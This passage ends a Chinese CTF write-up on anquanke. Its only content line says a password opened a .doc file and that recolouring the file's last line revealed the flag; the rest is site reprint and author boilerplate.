密码是`xyj` 成功打开doc文件，是啥诗曰啥的，发现最后一行好像有东西，但是没显示出来，换一下颜色，出来flag:

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **H@ndy_H4ns3n** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241002](/post/id/241002)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [CSTC](/tag/CSTC)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t013002aaebb8a1e6dd.png) H@ndy_H4ns3n

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

